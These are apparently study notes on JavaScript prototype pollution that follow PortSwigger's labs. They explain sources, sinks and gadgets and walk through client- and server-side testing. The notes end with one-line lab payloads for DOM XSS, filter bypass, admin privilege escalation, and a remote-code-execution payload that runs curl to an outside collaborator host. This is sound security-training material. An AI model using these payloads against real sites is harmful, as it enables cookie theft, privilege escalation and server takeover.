# Prototype pollution
Prototype pollution is a JavaScript vulnerability where an attacker can add arbitrary properties to global object prototypes, which are then inherited by user-defined objects. 

While prototype pollution is often not directly exploitable, it allows attackers to control object properties that would otherwise be inaccessible. This can be chained with other vulnerabilities, leading to further exploitation. In client-side JavaScript, this often results in DOM XSS, while server-side prototype pollution can lead to remote code execution.

[JavaScript prototypes and inheritance](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance)


## Prototype pollution vulnerabilities
Prototype pollution vulnerabilities occur when a JavaScript function merges an object with user-controlled properties into another object without sanitizing the keys.

Attackers can inject keys like `__proto__` with arbitrary nested properties. 

Since `__proto__` has a special role in JavaScript, the merge may assign properties to the object's prototype instead of the target object, allowing attackers to "pollute" the prototype with harmful values that can be exploited by the application.

Although any prototype object can be polluted, it most commonly affects the global `Object.prototype`.   

Exploiting this vulnerability requires:
- **Prototype pollution source** : Input that allows injecting arbitrary properties into prototype objects.
- **Sink** : A JavaScript function or DOM element that allows arbitrary code execution.
- **Exploitable gadget** : A property passed into a sink without proper filtering or sanitization.


### **[Prototype pollution source](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-sources)**

A prototype pollution source refers to any user-controlled input that allows the addition of arbitrary properties to prototype objects. The most common sources include:

- URL, through the query or fragment string (hash)
- JSON-based input
- Web messages


### **[Prototype pollution sinks](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-sinks)**

A prototype pollution sink refers to a JavaScript function or DOM element that can be accessed through prototype pollution, enabling the execution of arbitrary JavaScript or system commands. 

Prototype pollution allows control over properties that would typically be inaccessible, potentially exposing more sinks within the target application. 

Developers unfamiliar with prototype pollution might incorrectly assume that these properties are not user-controllable, leading to minimal filtering or sanitization.


### **[Prototype pollution gadgets](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-gadgets)**

A gadget in prototype pollution refers to a property that can turn the vulnerability into an exploit. A gadget must:

- Be used by the application in an unsafe way, such as being passed to a sink without proper filtering or sanitization.
- Be attacker-controllable via prototype pollution, meaning the object must be able to inherit a malicious version of the property added to the prototype.

A property cannot be a gadget if it is defined directly on the object, as the object's own version of the property takes precedence over the malicious version added to the prototype. Additionally, robust websites may set the object's prototype to null, preventing it from inheriting any properties.


## [Client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side)
Test flow :  
1. **Find a prototype pollution source**  

    The goal is to inject arbitrary properties into an object's prototype by using various methods such as the query string, URL fragment, or JSON input.
    
    1. Try injecting a property like below. In the URL of a vulnerable website.
        ```
        __proto__[foo]=bar
        ```
    2. Check if Object.prototype.foo is successfully polluted by inspecting it in the browser's console.
        >If it shows "bar", the attack is successful.  
        >If it shows undefined, it wasn't successful.
    3. If unsuccessful, switch between different techniques such as using dot notation and try again with different sources.
        ```
        __proto__.foo=bar
        ```
        
2. **Identify a gadget**  
    Once you've identified a source that lets you add arbitrary properties to the global Object.prototype, the next step is to find a suitable gadget that you can use to craft an exploit.
    
    1. Search the source code for properties used by the application or imported libraries.
    2. In Burp Suite, enable response interception to capture the JavaScript you want to test.
    3. Insert a debugger statement at the start of the script to pause its execution.
    4. In Burp's browser, go to the page that loads the target script, and when execution pauses, open the console.
    5. Add the following code to track when a specific property is accessed:
    ```javascript
    Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
        get() {
            console.trace();
            return 'polluted';
        }
    });
    ```
    6. Resume script execution and monitor the console. If the property is accessed, a stack trace will be logged.
    7. Use the stack trace to find the line of code where the property is read.
    8. Step through the execution to check if the property is passed to a dangerous function (e.g., `innerHTML`, `eval()`).
    9. Repeat the process for other properties you suspect could be gadgets.
  
3. **Craft an exploit**  
* **Prototype pollution via the constructor**   
    In stead of `__proto__`, use a `constructor` property. Can also access any object's prototype as follows:
   ```
   myObject.constructor.prototype        // Object.prototype
   myString.constructor.prototype        // String.prototype
   myArray.constructor.prototype         // Array.prototype
   ```
* **Bypassing flawed key sanitization**  
    In case failing to recursively sanitize the input string. For example, consider the following URL :
  ```
  vulnerable-website.com/?__pro__proto__to__.gadget=payload
  ```
  If the sanitization process just strips the string `__proto__` without repeating this process more than once which is a potentially valid prototype pollution source:

## [Prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis)

- fetch()method
For exampl `Object.prototype` with a `headers` property containing a malicious `x-username` header as follows: 
```
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```
- Object.defineProperty()method  
may be able to bypass this defense by polluting `Object.prototype` with a malicious `value` property.  
If this is inherited by the descriptor object passed to `Object.defineProperty()`, the attacker-controlled value may be assigned to the gadget property after all. 

```
?__proto__[value]
```

## [Server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side)
For a number of reasons, server-side prototype pollution is generally more difficult to detect than its client-side variant: 
- No source code access
- Lack of developer tools
- The DoS problem
- Pollution persistence 

POST or PUT requests that submit JSON data to an application or API are good targets for Prototype Pollution attacks. These requests often receive a JSON response containing the new or updated object. In such cases, it's possible to attempt to pollute the global `Object.prototype` by including arbitrary properties in the JSON payload.

An example of how to perform this attack:
1. Send a POST or PUT request with a payload that attempts to inject properties into `Object.prototype`. For example:
```json
{
    "__proto__": {
        "pollutedProperty": "polluted"
    }
}
```
2. If the server processes this data without proper validation, it could add the pollutedProperty to the global `Object.prototype`.

3. Afterward, every object in the application might inherit this property, leading to unexpected behavior or security issues.









### Labs Portswigger
>Approach :  
It fires very well with the DOM-Invader extension. Arises, usually, in these JS files: searchLogger.js, searchLoggerAlternative.js and similar searchLogger.

1. DOM XSS via client-side prototype pollution
```
https://site.com/?__proto__[transport_url]=data:,alert(1)
```

2. DOM XSS via an alternative prototype pollution vector
```
https://site.com/?__proto__.sequence=alert(1)-
```

3. Client-side prototype pollution via flawed sanitization
```
https://site.com/?__pro__proto__to__[transport_url]=data:,alert(1)
```

4. Client-side prototype pollution in third-party libraries
```
<script>
location="https:/site.com/#__proto__[hitCallback]=alert(document.cookie)"
</script>
```

5. Client-side prototype pollution via browser APIs
```
https://site.com/?__proto__[value]=data:,alert(1)
```

6. Privilege escalation via server-side prototype pollution
```
Billing and Delivery Address:
"__proto__": {
    "isAdmin":true
}
```

7. Detecting server-side prototype pollution without polluted property reflection
```
"__proto__": {
 "status":555
}
```

8. Bypassing flawed input filters for server-side prototype pollution
>https://portswigger.net/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization
```
 "constructor":{
"prototype":{
"isAdmin":true
}}
```

9. Remote code execution via server-side prototype pollution
```
"__proto__":
{"execArgv": [
  "--eval=require('child_process').execSync('curl https://kmazepmj6dq3jzpk2e4ah7fzuq0ho9cy.oastify.com')"
]}
```
